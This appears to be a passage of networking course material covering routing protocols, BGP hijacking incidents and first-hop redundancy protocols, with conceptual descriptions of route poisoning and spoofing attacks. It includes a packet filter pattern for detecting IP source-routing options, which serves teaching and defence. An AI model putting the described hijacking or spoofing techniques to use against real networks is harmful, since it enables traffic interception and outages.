Once a route with the most matched bits is found, it will forward the packet to the next-hop ip address in the table entry and re-encapsulate the packet into a new frame appropriate for the exiting interface.



Routing Table Matching Process





Administrative Distance

Routers uses an AD to determine the best source route to install into the IP routing table. The AD represents the "trustworthiness" of the route; the lower the AD, the more trustworthy the route source.

For example, if a router learned about the 10.0.0.0/24 from EIGRP, OSPF and RIP, the EIGRP route entry would be in installed into the routing table. This is because EIGRP AD 90 is lower than OSPF AD 110 and RIP AD 120.

If anything should happen with the EIGRP route then the OSPF route is installed into the routing table.


What if the router learned of the same network route via the same routing protocol?
Metric(s) then comes into account to determine the best path to a destination network.
Using 2 or more routes to a destination network is called "Load Balancing".
Many routing protocols only allow "equal cost" load balancing. This means that the metric must be the same for each "Best route".
Some routing protcols do allow unequal cost load balancing. This is where it can use the primary route as well as other routes that are close to the best route.


Metric

Some of the most common metrics that routing protocols can use are:

hop
bandwidth
delay
reliability
load
MTU
cost
administratively defined
Routing Protocol with Metric Name

RIP	Hop count
EIGRP	Bandwidth, Delay, Load, Reliability
OSPF	Cost (Bandwidth)
IS-IS	Cost (Assigned by Admin)
BGP	Policy assigned by Admin


Security Concern with the router lookup process

The IPv4 protocol has an options field in its header and it is possible to add source routing information to specify the specific path for traffic to take regardless of what is in the routing table. This can allow attackers to manipulate the flow of traffic and possibly bypass some network security devices.

Typically an IPv4 packet does not include options and can easily be scanned for using BPF filters.

ip[0] & 0x0f > 5
Soon we will discuss routing protocols. By understanding the operation of these protocols a malicious attacker can "inject" fake routing updates in order to change your routing scheme.



Resources


Instructor Note


2.2.2 Dynamic Routing Protocols operation and vulnerabilities¶
Dynamic routing protocols allow the automated updating of network routes within a routing Autonomous System (AS) network. Different routing protocols have different Administrative Distances (AD) and metrics to be used for route selection and entry into the routing table.

When the router is configured with a dynamic routing protocol, and finds neighboring routers with the same routing protocols, it will begin to share and learn about remote networks storing this information in the Router Information Database (RIB). This will be used to populate the routing table.



Resources


Instructor Note


2.2.2.1 Classful vs Classless¶


Routing protocols are either Classful or Classless.

Classful routing protocols (RIPv1 and IGRP) do not send subnet mask information with their routing updates.

Classless routing protocols (RIPv2, EIGRP, OSPF, and IS-IS) support VLSM and CIDR which include the subnet mask information in their routing updates; classful protocols do not.

IPv6 routing protocols are all considered classless.



Resources


Instructor Note


2.2.2.2 Routed vs Routing Protocols¶


Routed protocols allows data to be routed. These protocols provide an addressing scheme and sub-netting. The addressing scheme identifies the individual host and the network to which it belongs. Each host address must be unique. All hosts on an internetwork must use the services of a routed protocol to communicate.

IPv4
IPv6
IPX
AppleTalk
Routing Protocols are used by routers to communicate routing information with each other. Unless all routes are manually entered into the router, the router needs to learn from other routers about the networks that they know. They use this shared information to populate their routing tables so that they can make better decisions when forwarding routed protocols such as IPv4.

Routing protocols are broken down to 2 types:

Interior Gateway Protocol (IGP) - is a type of protocol used for exchanging routing information between gateways (commonly routers) within an autonomous system
RIP (v1, v2, ng)
EIGRP and EIGRP for IPv6
OSPF (v2 and v3)
IS-IS
Exterior Gateway Protocol (EGP) - is a routing protocol used to exchange routing information between autonomous systems
BGP
Not all routing protocols support all "routed" protocols. If you are running more than one then its possible that you may have to run additional routing protocols to ensure that those routes are advertised.



Resources


Instructor Note


2.2.2.3 IGP vs EGP¶


Interior Gateway Protocols (IGP):

Routing protocols that are used within an Autonomous System (AS).
Referred to as intra-AS routing.
Organizations and service providers IGPs on their internal networks.
IGPs include RIP, EIGRP, OSPF, and IS-IS.
Exterior Gateway Protocols (EGP):

Used primarily for routing between autonomous systems.
Referred to as inter-AS routing.
Service providers and large companies will interconnect their AS using an EGP.
The Border Gateway Protocol (BGP) is the only currently viable EGP and is the official routing protocol used by the Internet.


Resources


Instructor Note


2.2.2.4 Autonomous Systems¶
IANA and RIRs



IANA Regional Internet Registries (RIR):

RIRs work in coordination with IANA to ensure the fair and efficient distribution of IP address resources globally. IANA allocates large blocks of IP addresses to the RIRs, and the RIRs, in turn, allocate smaller blocks of IP addresses to ISPs, organizations, and end-users within their respective regions. This hierarchical distribution system helps manage the limited pool of IPv4 addresses and ensure that IP address resources are allocated efficiently and fairly.

ARIN (American Registry for Internet Numbers):

Responsible for the allocation and management of IP addresses in North America, parts of the Caribbean, and sub-equatorial Africa.
RIPE NCC (Réseaux IP Européens Network Coordination Centre):

Responsible for the allocation and management of IP addresses in Europe, Central Asia, and the Middle East.
APNIC (Asia-Pacific Network Information Centre):

Responsible for the allocation and management of IP addresses in the Asia-Pacific region.
LACNIC (Latin America and Caribbean Network Information Centre):

Responsible for the allocation and management of IP addresses in Latin America and parts of the Caribbean.
AfriNIC (African Network Information Centre):

Responsible for the allocation and management of IP addresses in Africa.


Autonomous systems

An Autonomous System (AS) is a collection of IP networks and routers under the control of one entity (such as an Internet service provider, a university, or a large enterprise) that presents a common routing policy to the Internet.
Autonomous Systems are identified by unique numbers called Autonomous System Numbers (ASNs), which are assigned by regional Internet registries (RIRs) such as ARIN, RIPE NCC, APNIC, LACNIC, and AfriNIC.

Each administrative entity is assigned a 16-bit (prior to 2007) or 32-bit number (after 2007) to uniquely identify itself to everyone on the internet.


AS109   CISCO-EU-109 Cisco Systems Global ASN
AS193   FORD-ASN - Lockheed Martin Western Development Labs
AS721   DoD Network Information Center Network
AS3598  MICROSOFT-CORP-AS - Microsoft Corporation
AS15169 GOOGLE - Google Inc.
AS numbers are assigned in blocks by the Internet Assigned Numbers Authority (IANA) to Regional Internet registries (RIRs).
The appropriate RIR then assigns AS numbers to entities within its designated area from the block assigned by the IANA.
Entities wishing to receive an AS number must complete the application process of their local RIR and be approved before being assigned an AS number.


Resources


Instructor Note


2.2.2.5 Distance Vector Routing Protocols¶


Distance Vector protocols are simplistic in their operation. They share entire routing tables with their directly connected neighbors and from these shared tables they determine two factors:

Distance: This identifies how far away the destination network is from the router and is based on a metric such as the hop count, cost, bandwidth, delay, and more. It takes the learned distance from their neighbor, adds the distance to their neighbor, and this gives them a total distance.

Vector: This specifies the direction to the remote network. The router advertises a path that it has learned which allows access to a remote network via one of its interfaces.

A router using a distance vector routing protocol will not have complete knowledge of the network or the entire path to a remote network. Distance vector protocols is typically called "routing by rumor". This means they only know what their directly connected neighbors tell them.

There are four distance vector IPv4 IGPs:

RIPv1: First generation legacy protocol
RIPv2: Simple distance vector routing protocol
IGRP: First generation Cisco proprietary protocol (obsolete and replaced by EIGRP)
EIGRP: Advanced version of distance vector routing


Resources


Instructor Note


2.2.2.6 Link State Routing Protocols¶


Compared to distance vector routing protocols, a router configured with a link-state routing protocol can create a complete view of the network. This is built by gathering information from all of the other routers to build a network topology.

Link state routing protocols tend to flood the network with Link State Advertisements (LSAs). Each router receives these updates and begins to build a map of the entire network. It will use its algorithms to compute the best routes from this map to all remote networks. After this is done no periodic updates are sent unless there is a change in the topology.

Link-state protocols work best in situations where:

The network design is hierarchical, usually occurring in large networks
Fast convergence of the network is crucial
The administrators have good knowledge of the implemented link-state routing protocol
There are two link-state IPv4 IGPs:

OSPF: Popular open standards-based routing protocol
IS-IS: Popular in service provider networks


Resources


Instructor Note


2.2.2.7 Distance Vector vs Link State¶
This chart shows the comparision between different routing protocols:

Protocol	Type	Convergence	Class	AD	Metric	Hop Limit	Classless	Algorithm	Transport Type	Routing updates
RIPv1	IGP	Slow	DV	120	Hop Count	15	NO	Bellman-Ford	UDP port 520	Broadcast full tables every 30 Sec
RIPv2	IGP	Slow	DV	120	Hop Count	15	Yes	Bellman-Ford	UDP port 520	Multicast 224.0.0.9 every 30 sec
RIPng	IGP	Slow	DV	120	Hop Count	15	Yes	Bellman-Ford	UDP port 521	Multicast FF02::9 every 30 sec
EIGRP	IGP	Very Fast	DV(h)	90	B/D/L/R	224	Yes	DUAL	IP protocol 88	Multicast 224.0.0.10
EIGRP IPv6	IGP	Very Fast	DV(h)	90	B/D/L/R	224	Yes	Dual	IP protocol 88	Multicast FF02::A
OSPF v2	IGP	Fast	LS	110	Cost	none	Yes	Dijkstra (SPF)	IP protocol 89	Multicast 224.0.0.5 and 224.0.0.6
OSPF v3	IGP	Fast	LS	110	Cost	none	Yes	Dijkstra (SPF)	IP protocol 89	Multicast FF02::5 and FF02::6
IS-IS	IGP	Fast	LS	115	Cost	none	Yes	Dijkstra (SPF)	L2 Protocol	Sends directly in a frame
BGP	EGP	Average	DV	20/200	Policy	none	Yes	Best Path	TCP port 179	Unicasts updates to neighbors
KEY:

Protocol: Routing protocol name
Type: either interior or exterior routing protocol
Convergence: How fast they are to share routing information throughout the intranet.
Class: either link state or distance vector.
AD: Administrative distance. Trustworthiness of the information source. Higher is more trustworthy.
Algorithm: How it computes the "best path" to the destination network using its metrics.
Transport Type: How is sends it update over the network.
Routing updates: Destination address it uses to send updates to neighbor routers supporting the same protocol.


Resources


Instructor Note


2.2.2.7 Routing Protocol vulnerabilities¶
Like most other protocols, routing protocols are susceptible to various forms of attacks. These attacks are possible if the malicious actor can determine the protocols in use and the networks being advertised. This can be done either from passive sniffing or from a current router configuration file. Some common attacks are:

Distributed Denial of Service (DDOS) - Attackers send more packets to the router than they can handle or process. This will cause the router to drop packets if proper QoS is not implemented.

Packet Mistreating Attacks (PMA) - Similar to DOS attacks, packet mistreating injects packets with malicious codes designed to confuse and disrupt the router and network.

Routing Table Poisoning (RTP) - Attackers can send specially crafted routing protocol packets to the router to poison the router's tables. Enabling authentication can help mitigate this attack.

Hit and Run DDOS (HAR) - DDOS attack on a specific network or router.

Persistent Attacks (PA) - similar to hit and run, in which they both look to inject frequent harmful data packages into the router and network, helping the hackers gain control. The attacker can redirect traffic as they want, send wrong routing updates, or simply delete the configuration of that router.



Resources


Instructor Note


2.2.2.9 BGP¶
BGP is one of only 2 Exterior Gateway Routing Protocols (EGP) created. The other called simply Exterior Gateway Protocol (EGP) was developed in 1982 by Eric C Rosen and David Mills and specified in [RFC 827] . It was a simple protocol that was eventually made obsolete by BGP version 4 published in [RFC 4271] .

BGP operates differently compared to IGP protocols. Rather than automatically advertising all internal networks, BGP is configured to specify the precise network and CIDR it will advertise. Instead of making best path selection based of metrics, it uses "paths" (which is loosly similar to hops used by RIP), network policies, or rule-sets. This makes BGP one of the most complicated routing protocols to configure. Where simple configuration errors with an IGP will have an impact on traffic within your network. Whereas a misconfiguration with BGP could have broad ramifications on the traffic routing throughout the entire world.

[Wikipedia BGP link]

Roadmap of the Internet - If DNS is the "address-book" of the Internet then BGP is the Roadmap or "Google Maps" of the Internet. It defines the path all traffic takes through the Internet. The Internet is nothing more than a web of millions of interconnected networks.

Routes traffic between Autonomous System (AS) Number - Internet Service Providers (ISP) and large organizations are assigned an Autonomous System (AS) Number by IANA. Each AS is viewed as a single entity to the rest of the world but within the AS it can contain thousands of subnetworks and routers. [List of AS numbers and owners according to bgplokingglass.com]

Think of an AS like a city or town and highways and interstates are the BGP pathways between them.
Advertises IP CIDR address blocks - Each AS is used to represent a CIDR block(s) of IP addresses and can contain thousands of individual routers and subnetworks. Rather than advertise each individual network address and CIDR throughout the AS like IGP do, BGP is manually configured to advertise "summary routes" that encompass all the internal networks. [How does BGP work video]

Think of this like street and building numbers in a town or city.
Establishes Peer relationships - BGP is an application layer protocol that communicates using TCP port 179. ISPs use BGP in order to share routing information with their peers. Each ISP's edge router uses TCP to establish "peer" relationships between other ISP edge routers in another AS to share addressing information. Rather than sending their updates to any BGP listening router, BGP must be manually configured to communicate with 'peer' neighbor routers. This eventually forms a web of communicating routers. [APNIC BGP map]

Complicated configuration - Does not operate and share routes automatically like other IGP. Network addresses must be manually configured to be advertised. Due to lack of trust between ISPs they employ series of filters and policies which makes BGP must harder and more complicated to configure.

This complicated configuration can lead to many errors and attacks over the internet.
Complicated and slow path selection - BGP uses a series of items in its path determination. [BGP path selection reference from CiscoZine.com] . "Best Path" in BGP does not mean its the most optimal path. It only routes by AS #'s and not the attributes within the AS themselves. Typically BGP prefers the route that takes the packet through the fewest amount of AS's.



Resources


Instructor Note


2.2.2.9.1 BGP Hijacking¶
Each individual organization has the ability to enforce the policies within their networks. However, there is no one governing organization that can enforce the internet. Each individual network is privately owned and controlled in various countries throughout the world. Each county is governed by their own rules, regulations and laws. To allow for the explosive growth of the Internet, it operated on a "trust" model. This means that ISPs were allowed to connect and share their network information with the rest of the world and were trusted that they would "play nice" with others. There was no way to realistically prevent intentional or accidental advertising of networks that the organization does not own.

BGP Hijacking works by:

Illegitimate advertising of addresses - BGP Hijacking (also called prefix hijacking, route hijacking or IP hijacking) works by illegitimately taking over IP CIDR address blocks and corrupting Internet routing tables by falsely advertising addresses of addresses you do not own.

Attack Vector

BGP propagates false information - When an AS announces a route to IP prefixes that it does not actually control, this announcement, if not filtered, can spread and be added to routing tables in BGP routers across the Internet. From then until somebody notices and corrects the routes, traffic to those IPs will be routed to that AS. It would be like claiming territory if there were no local government to verify and enforce property deeds.

Purpose - As a result of BGP hijacking, Internet traffic can traverse incorrect paths for the purpose of:

stealing prefixes - mostly temporarily. This is usually noticed within minutes to hours. Although repairing issue can take minutes to hours as well depending on finding the right technicians to resolve the issue. Usually larger organizations can repair the issue faster than smaller ones due to their contacts and influence.
monitoring traffic - this is useful to monitor traffic that the attacker may not be "in line" of. This will divert all traffic to a target through your network.
intercept (and possibly modify) Internet traffic - similar to monitoring, packets can also be modified since it will traverse the attackers network infrastructure.
'black holing' traffic- since the traffic was diverted, the attack's intent could send traffic to the proverbial "bit bucket" and simple discard the packets.
direct users to a fake website as part of a man-in-the-middle attack. Rather than taking users to a legitimate website, an attacker can direct traffic to a fake (cloned) website.
BGP favors the shortest, most specific path to the desired IP address - In order for the BGP hijack to be successful, the route announcement must either:

Advertise a more specific route. This is easily done by announcing smaller range of IP addresses than what other AS's had previously announced. (i.e. 192.168.1.0 /24 is more specific than 192.168.0.0 /16)

Offer a shorter route to certain blocks of IP addresses. If the address can be advertised and the path is perceived to be "shorter" it will overwrite a legitimate path. (i.e. route to ip prefix with 4 AS 'hops" is better than route with 5 AS 'hops' )

[BGP Hijacking - Cloudfare]

Defense

Ultimately it is difficult to defend against. Each ISP can only control their own advertisements and not what is advertised from other ISPs. There are some implementation to help guard against it but each has its own challenges.

IP prefix filtering -The ISP can filter what IP prefixes (address blocks) it should advertise and accept. This can help prevent any accidental route hijacking but its not feasible to enforce all ISPs to perform this.

BGP hijacking detection -Signs of BGP Hijacking can include:

Tracking the change in TTL of incoming packets. This can be easily "mangled" by a MitM attacker to hide.
Increased Round Trip Time (RTT) which increases latency. This can be managed depending on proximity to the primary prefix owner. If closer, then latency can be minimized. Else the attack can be localized to a "Region".
Monitoring misdirected traffic (change in AS path from tools like Looking Glass). Hard to discover without active monitoring.
Making BGP more secure - Was designed to make the Internet work but not designed with security in mind. BGPsec is being developed but unsure when it will be adopted everywhere.



BGP Demo


Resources


Instructor Note


2.2.2.9.2 BGP Hijacking Public incidents¶
Below is a list of several examples of BGP Hijacking.

[April 1997] [April 1997]: The ["AS 7007 incident"]

[December 24, 2004] [December 24, 2004]: TTNet in Turkey hijacks the Internet

[May 7, 2005]: Google's May 2005 Outage

[January 22, 2006]: Con-Edison hijacks big chunk of the Internet

[February 24, 2008]: Pakistan's attempt to block YouTube access within their country takes down YouTube entirely.

[November 11, 2008]: The Brazilian ISP CTBC - Companhia de Telecomunicações do Brasil Central leaked their internal table into the global BGP table. It lasts over 5 minutes. Although, it was detected by a RIPE route server and then it was not propagated, affecting only their own ISP customers and few others.

[April 8, 2010]: Chinese ISP hijacks the Internet

[July 2013]: link[The Hacking Team] aided Raggruppamento Operativo Speciale (ROS - Special Operations Group of the Italian National Military police) in regaining access to Remote Access Tool (RAT) clients after they abruptly lost access to one of their control servers when the Santrex IPv4 prefix 46.166.163.0/24 became permanently unreachable. ROS and the Hacking Team worked with the Italian network operator Aruba S.p.A. (AS31034) to get the prefix announced in BGP in order to regain access to the control server.

[February, 2014]: Canadian ISP used to redirect data from ISPs.- In 22 incidents between February and May a hacker redirected traffic for roughly 30 seconds each session. Bitcoin and other crypto-currency mining operations were targeted and currency was stolen. Arti

[January 2017]: Iranian pornography censorship.

[April 2017]: Russian telecommunication company Rostelecom (AS12389) originated 37 prefixes for numerous other Autonomous Systems. The hijacked prefixes belonged to financial institutions (most notably Master Card and Visa), other telecom companies, and a [variety of other organizations]. Even though the possible hijacking lasted no more than 7 minutes it is still not clear if the traffic got intercepted or modified.

[December 2017]: Eighty high-traffic prefixes normally announced by Google, Apple, Facebook, Microsoft, Twitch, NTT Communications, Riot Games, and others, were announced by a Russian AS, DV-LINK-AS (AS39523).[19][20]

[April 2018]: Roughly 1300 IP addresses within Amazon Web Services space, dedicated to [Amazon Route 53], were hijacked by eNet (or a customer thereof), an ISP in Columbus, Ohio. Several peering partners, such as Hurricane Electric, blindly propagated the announcements.

[July 2018]: Iran Telecommunication Company (AS58224) originated 10 prefixes of [Telegram Messenger].

[November 2018]: US-based China Telecom site originated Google addresses.

[November 2018]: A group called "3ve" used BGP hijacking to make 29M in ad clicking.

[June 6 2019]. Mobile internet traffic from multiple carriers in Europe took an unintended turn through China Telecom for over two hours on June 6 because of a route leak incident. The problem occurred at Safe Host, a Swiss data center collocation company identified with the autonomous system number (ASN) AS21217 and resulted in leaking over 70,000 routes to China Telecom (AS4134).

[April 1 2020]. Many networks witnessed a massive [BGP hijack by AS12389] (Rostelecom). The hijack redirected over 8,800 major internet traffic routes through its servers for about an hour. Major companies affected by the hijack included Google, Amazon, Facebook, Akamai, Cloudflare, GoDaddy, Digital Ocean, Joyent, LeaseWeb, Hetzner, and Linode.

[April 5 2020]. Russian telco hijacks internet traffic for Google, AWS, Cloudflare, and others. (another link)

[September 30 2020]. Radware customers experienced cloud service interruptions. The outage was caused by a so-called BGP Hijacking incident as a consequence of an unintended and unfortunate technical error in one of the world’s largest ISPs, Telstra. While Radware immediately detected and cooperated closely with Telstra to mitigate the problem, the interruptions and suffered outages were out of Radware’s direct control.

[April 16 2021]. Large BGP routing leak out of India: over 30,000 BGP prefixes hijacked via Vodaphone Idea Ltd (AS55410) causing 13X spike in inbound traffic. Prefixes were from around the globe but mostly US including Google, Microsoft, Akamai, and Cloudflare. (another link)

[October 4 2021]. Facebook along with Instagram, Messenger, WhatsApp, and OculusVR were BGP routes were taken down by a mistaken BGP update. Cloudflare reports that the service saw a ton of BGP updates from Facebook (most of which were route withdrawals, or erasing lines on the map leading to Facebook) right before it went dark.

[February 3 2022]. Attackers hijacked BGP prefixes that belonged to a South Korean cryptocurrency platform, and then issued a certificate on the domain via ZeroSSL to serve a malicious JavaScript file, stealing $1.9 million worth of cryptocurrency.

[March 28 2022]. RTComm.ru (AS 8342) hijacked a prefix 104.244.42.0/24 used by Twitter (AS 13414).

[August 17 2022]. Amazon recently lost control of IP addresses it uses to host cloud services and took more than three hours to regain control, a lapse that allowed hackers to steal $235,000 in cryptocurrency.

[September 20 2023]. Balancer.fi fell victim to a BGP (Border Gateway Protocol) Hijacking attack. Users who accessed the platform via the compromised link found their wallets were at risk of phishing attacks.

[June 27 2024]. Internet giant Cloudflare reports that its DNS resolver service, 1.1.1.1, was recently unreachable or degraded for some of its customers because of a combination of Border Gateway Protocol (BGP) hijacking and a route leak. The incident occurred last week and affected 300 networks in 70 countries.



Resources


Instructor Note


2.2.3 Compare Static routing vs. dynamic routing¶


Resources


Instructor Note


2.2.3.1 Static Routing¶


Static routes are manually configured on each router by a network administrator to route traffic for every specific remote network. This is common for small networks with few a routes but becomes cumbersome on larger networks. They also provide security for some larger networks as all traffic takes predetermined routes.

Static routing provides some advantages over dynamic routing, including:

Static routes do not advertise over the network, resulting in better security.

Static routes do not use bandwidth like dynamic routing protocols to send updates and no CPU cycles are used to calculate and communicate routes.

The path a static route uses to send data is predetermined.

Static routing has the following disadvantages:

Initial configuration and maintenance is time-consuming.

Configuration is prone to error, especially on large networks.

Administrator must intervene to update routing information or to bypass network faults.

Does not scale well with growing networks; maintenance becomes cumbersome.

Requires complete knowledge of the whole network for proper implementation.



Resources


Instructor Note


2.2.3.2 Dynamic Routing¶


Routing protocols allow routers to dynamically exchange routing information to build routing tables. If 2 or more routers share the same protocol they can communicate with each other. The purpose of dynamic routing protocols includes:

Discover new remote networks

Maintaining current routing information

Choose best path to remote networks

Recalculate a new path to a remote network should the primary fail

Dynamic routing provides some advantages over static routing, including:

Easier to configure and maintain.

Administrator does not need to intervene to update tables during network outages.

Scales very well on growing networks.

Dynamic routing has the following disadvantages:

Routing protocols flood the network updates which consumes bandwidth and can be intercepted.

Uses extensive CPU and RAM to run its algorithms and build its databases.

Path data can travel is not deterministic and can change fluidly.



Resources


Instructor Note


2.2.3.3 Routing Protocol Security Issues¶
Routing table poisoning - The issue with routing protocols is that they inherently trust neighbors running the same routing protocol. This means that an attacker can "inject" fake or falsified routing updates into the network to either direct traffic to his system or to cause a DOS.


Resources


Instructor Note


2.2.4 Understand First Hop Redundancy Protocols and their vulnerabilities¶
First Hop Redundancy Protocol



Redundancy on networks are critical should a fault occur. One limitation on user PCs is that you can only configure one default gateway. Should this device fail the users cannot get out of their local network. Even if 2 or more routers are configured for redundancy, each interface will have a different IP address and both cannot be configured on users. FHRP provides a mechanism to provide alternate default gateways in switched networks where two or more routers are connected to the same network.

FHRP works by assigning a virtual router to 2 or more gateway routers. This works by configuring a FHRP protocol on all participating gateway interfaces to share a "floating IP" address and MAC. Each interface will have its unique IP assigned to the interface but all will share this floating IP and MAC.

Several types of FHRPs were developed:

Hot Standby Router Protocol (HSRP)

A Cisco-proprietary FHRP designed to allow for transparent fail-over of IPv4 networks.
Defined in [RFC 2281].
One router interface will be set as "active" and the others set as "standby".
Once the active interface will forward traffic to other networks.
Standby interfaces serve as backups in case the active fails.
Active interface sends multicast "Hello" packets to inform the backups that its still operational.
IPv4: HSRP for IPv4 operates on the default multicast address 224.0.0.2 (v1) or 224.0.0.102 (v2).
IPv6: HSRP for IPv6 operates on the multicast address ff02::66.
HSRP States
Initial: The initial state when the router has not yet started HSRP.
Learn: The router has not yet learned the virtual IP address.
Listen: The router has learned the virtual IP address but is not yet the active or standby router.
Speak: The router is participating in the HSRP election process and sending hello messages.
Standby: The router is ready to take over as the active router if needed.
Active: The router is currently handling traffic and serving as the default gateway for the virtual IP address.
Timers
Hello Timer: Controls how frequently HSRP hello messages are sent between routers. Default is 3 seconds.
Hold Timer: Defines how long a router will wait for hello messages before declaring the active router to be down. Default is 10 seconds.
Goodbye Timer: Used by the active router to notify the standby router of its impending failure. This is an optional feature in HSRP.
Versions
HSRP Version 1: The original version of HSRP, which supports up to 255 groups and does not support IPv6.
HSRP Version 2: Introduced support for IPv6, more groups (up to 4096), and additional features like enhanced authentication and improved group management.

interface GigabitEthernet0/1
    ip address `192.168.1.1` `255.255.255.0`
    standby 1 ip `192.168.1.254`
    standby 1 priority 110
    standby 1 preempt
    standby 1 authentication cisco123
Virtual Router Redundancy Protocol

An industry-standard protocol defined in [RFC 3768] that offers similar functionality to HSRP.
Like HSRP, VRRP allows multiple routers to work together to provide redundancy for the default gateway.
One router is elected as the master router, and the others are backup routers.
The master router sends periodic advertisements to inform the backup routers of its status.
If the master router fails, one of the backup routers is elected as the new master.
IPv4: VRRP for IPv4 operates on the default multicast address 224.0.0.18.
IPv6: VRRP for IPv6 operates on the multicast address ff02::12.
VRRP States
Initialize: The router has not yet started VRRP.
Backup: The router is a backup and will take over if the master fails.
Master: The router is the active router handling traffic for the virtual IP address.
Timers
Advertise Interval: Defines how frequently the master router sends VRRP advertisements to inform backup routers of its status. The default interval is 1 second.
Master Down Interval: The time a backup router waits after not receiving advertisements before assuming the master router has failed. The default is 3 times the advertise interval.
Versions
VRRPv1 - Defined in RFC 2338, VRRPv1 was the original version of the protocol.
VRRPv1 supports IPv4 only.
Uses an 8-bit virtual router identifier (VRID), which limits the number of virtual routers to 256.
Lacks support for authentication, which can lead to potential security issues.
Provides basic router redundancy with failover and virtual IP address sharing.
VRRPv2 - Defined in RFC 3768, VRRPv2 builds on VRRPv1 with several improvements.
VRRPv2 still supports IPv4 but with enhanced features over VRRPv1.
Uses a 256-bit VRID, allowing more flexibility in configuration.
Adds support for MD5 authentication to secure VRRP advertisements and prevent unauthorized routers from participating.
Supports preemption, allowing a higher-priority router to take over as the master if it becomes available.
Improves stability and robustness over the original VRRPv1 implementation.
VRRPv3 - Defined in RFC 5798, VRRPv3 extends VRRP to support IPv6 in addition to IPv4.
Provides support for IPv6 addresses, which is essential for modern networks transitioning to IPv6.
Uses the multicast address ff02::12 for IPv6 communication.
Maintains a 256-bit VRID, similar to VRRPv2.
Continues to support MD5 authentication and extends security features.
Includes additional capabilities for more sophisticated network environments.

interface GigabitEthernet0/1
    ip address `192.168.1.1` `255.255.255.0`
    vrrp 1 ip `192.168.1.254`
    vrrp 1 priority 110
    vrrp 1 preempt
    vrrp 1 authentication md5 key-string cisco123
Gateway Load Balancing Protocol (GLBP)

GLBP is another Cisco proprietary protocol that extends the functionality of HSRP and VRRP by providing load balancing in addition to redundancy.
GLBP allows multiple routers to share the traffic load for a virtual IP address, providing both redundancy and increased network capacity.
GLBP uses an active virtual gateway (AVG) to assign different virtual MAC addresses to different routers, distributing traffic across multiple gateways.
Cisco introduced IPv6 support in IOS release 12.2(33)SXI in August 2007.
IPv4: GLBP for IPv4 operates on the default multicast address 224.0.0.102.
IPv6: GLBP for IPv6 operates on the multicast address ff02::66.
GLBP States
Initialization: The router has not yet started GLBP.
Listen: The router has received GLBP advertisements but has not yet assumed any role.
Speak: The router is participating in the election process and sending advertisements.
Active: The router is the AVG and is managing load balancing and redundancy.
Standby: The router is a backup for the AVG and will take over if the AVG fails.
Timers
Hello Timer: Defines how frequently GLBP hello messages are sent. Default is 3 seconds.
Hold Timer: Defines how long a router waits for hello messages from the AVG before considering it down. Default is 10 seconds.
Load Balancing Methods
Round-Robin: Distributes traffic evenly across all available routers.
Weighted Load Balancing: Allows routers to be assigned different weights, with traffic distributed based on these weights.
Host-Based Load Balancing: Distributes traffic based on the MAC address of the requesting host, which can help to achieve more balanced traffic distribution.

interface GigabitEthernet0/1
    ip address `192.168.1.1` `255.255.255.0`
    glbp 1 ip `192.168.1.254`
    glbp 1 priority 110
    glbp 1 preempt
    glbp 1 authentication md5 key-string cisco123
    glbp 1 load-balancing weighted
    glbp 1 weight 150
FHRP Attack:

Routers must exchange FHRP hello packets at regular intervals. Packets are sent using the multicast address of specific to FHRP used. Since multicasts are flooded over the network similar to Broadcasts, they can be intercepted by any host with layer two connectivity and can inspect the FHRP parameters.

Spoofing Attacks: An attacker can send FHRP hello packets to manipulate the FHRP election process, potentially becoming the active router and intercepting traffic.

Transport to Application Layer¶
Lesson Number: 112-CCTC15

Slides¶
Transport to Application Layer Slides
3.0 Outcomes¶
Explain OSI Layer 4 ports, protocols and headers
Describe Transport Layer Protocols
Review Well-known, Registered and Dynamic port ranges
Describe TCP reliability using sequence and acknowledgment numbers
Analyze TCP and UDP headers
Explain TCP Options
Identify hexadecimal representations of transport layer protocol headers
Explain OSI Layer 5 protocols and headers
Understand Virtual Private Networks (VPN)
Examine L2TP and PPTP tunning protocols
Understand proxies
Examine SOCKS protocol
Examine Network Basic Input Output System (NETBIOS) protocol
Recognize well-known NetBIOS suffixes (services) and their potential for operational impact
Examine Server Message Block protocol
Examine Remote Procedure Call (RPC) protocol
Explain OSI Layer 6 functions and responsibilities
Explain the presentation layer functions and responsibilities
Explain OSI Layer 7 protocols and headers
Analyze Telnet protocol
Analyze Secure Shell Protocol (SSH)
Analyze Hypertext Transfer Protocol (Secure) (HTTP(s))
Analyze Domain Name System (DNS) protocol
Examine DNS usage with UDP and TCP
Explain DNS Records
Explain DNS architecture
Analyze File Transfer Protocol (FTP)
Analyze Trivial File Transfer Protocol (TFTP)
Analyze Simple Mail Transfer Protocol (SMTP)
Analyze Post Office Protocol (POP)
Analyze Internet Message Access Protocol (IMAP)
Analyze Dynamic Host Configuration Protocol (DHCP) version 4 and 6 protocol
Explain DHCP Vulnerabilities
Analyze Network Time Protocol (NTP) and vulnerability
Analyze Terminal Access Controller Access-Control System Plus (TACACS+) Protocol
Analyze Remote Authentication Dial-In User Service (RADIUS) protocol
Analyze Diameter Protocol
Analyze Simple Network Management Protocol (SNMP)
Analyze Real-time Transport Protocol (RTP)
Analyze Remote Desktop Protocol (RDP)
Analyze Kerberos
Analyze Lightweight Directory Access Protocol (LDAP)


Layers 4 through 7 of the OSI model are crucial in cybersecurity, facilitating communication, managing traffic, and offering application-layer services.

Layer 4 (Transport layer) protocols like TCP (Transmission Control Protocol) and UDP (User Datagram Protocol) ensure reliable data transmission. TCP provides connection-oriented communication with error detection and flow control, while UDP is connectionless, suited for real-time applications. Understanding these protocols helps optimize performance and implement security measures such as firewall rules based on port numbers.

Layer 5 (Session layer) manages the establishment, maintenance, and termination of sessions between devices. While session management is often conceptual, it’s essential for secure, authenticated communication. Professionals can use it to prevent session hijacking and manage timeouts.

Layer 6 (Presentation layer) ensures proper data representation and encryption. Protocols like SSL/TLS provide encryption and data integrity for secure communication, enabling secure channels and preventing eavesdropping.

Layer 7 (Application layer) includes protocols like HTTP, SMTP, and SSH, enabling end-user communication. Understanding these protocols is vital for defending against application-layer attacks (e.g., SQL injection, XSS, phishing) and implementing security controls such as web application firewalls and intrusion detection systems.

In summary, Layers 4-7 are critical for secure and efficient communication. A deep understanding of these protocols allows cybersecurity professionals to enhance security, protect against threats, and safeguard critical information.



Resources


Instructor Note


3.1 Explain OSI Layer 4 ports, protocols and headers¶
Layer 4 of the OSI (Open Systems Interconnection) model is the Transport Layer. The Transport Layer is responsible for providing end-to-end communication between hosts, ensuring that data is reliably delivered and that communication sessions are established, maintained, and terminated.

The two main protocols at this layer are:

